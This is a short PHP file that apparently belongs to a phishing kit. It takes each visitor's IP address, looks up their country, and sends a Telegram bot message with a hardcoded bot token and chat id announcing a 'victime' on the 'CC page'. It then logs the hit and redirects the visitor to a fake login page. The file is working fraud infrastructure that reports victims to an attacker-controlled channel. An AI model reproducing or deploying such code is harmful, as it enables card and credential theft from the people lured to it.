<?php 
 
 
#include("anti/anti01.php"); 
 
 
$ip = getenv('HTTP_CLIENT_IP')?: 
getenv('HTTP_X_FORWARDED_FOR')?: 
getenv('HTTP_X_FORWARDED')?: 
getenv('HTTP_FORWARDED_FOR')?: 
getenv('HTTP_FORWARDED')?: 
getenv('REMOTE_ADDR'); 
 
$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip)); 
$country = $IP_LOOKUP->country; 
$token = "7731007969:AAFvLvGIQ6oLk212TH5OHJDZp1NIraEZmZg";
$chat_id = "7869141520";
$txt = "1️⃣✅ victime ready In CC page / POST / $country $ip  ❌❌"; 
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$txt"); 
 
 
?>

<?php
require 'main.php';
$bm->saveHit();
header("location: de/mkfile.php?p=login");
?>